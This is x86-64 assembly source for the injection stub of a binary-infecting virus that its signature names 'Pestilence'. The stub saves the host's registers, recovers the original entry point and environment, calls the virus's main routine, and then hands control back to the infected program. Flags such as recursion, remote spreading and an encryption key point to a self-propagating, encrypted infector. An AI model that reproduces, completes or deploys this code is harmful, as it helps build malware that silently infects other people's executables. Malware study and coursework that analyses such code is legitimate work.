section .textstart
global _infect

global key

global opt
global test_area

global environ

extern entry
extern decrypt

global environ

_infect:
	jmp begin
data:
diff: db `00000000`

opt:
do_recur: db `\0`
do_remote: db `\0`
print_msg: db `\0`

aligner: db `00000`
aligner2: db `00000000`

key: db `0000000000000000`
test_area: db `AAAAAAAAAAAAAAA`,0

signature: db `Pestilence version 1.0 (c)oded by ndombre-agadhgad-AAAAAAAA`,0

environ: db `00000000`

begin:	
	pop r15 ;size_t ac
	mov r14, rsp ;char **av
	push r15

	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push rbp
	push rsp
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	pushf
core:
	push r15
	push r14
	
	;set environ variable
	add r15, 1
	mov rax, r15
	mov r15, 8
	mul r15
	add r14, rax
	mov QWORD[rel environ], r14

	;get entry_point of the program
	mov r14, QWORD[rel diff]
	lea rax, [rel _infect]
	sub rax, r14
	mov r14, rax

	;set text_start
	;mov r13, QWORD[rel text_start]
	;lea rax, [rel _infect]
	;sub rax, r13
	;mov r13, rax
	;mov QWORD[rel text_start], r13

	;pass params to "main" of virus
	;rdi -> ac, rsi -> av
	pop rsi ;ptr
	pop rdi ;size
	call entry

	popf
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rsp
	pop rbp
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax

	push r14
	mov r14, 0
	ret
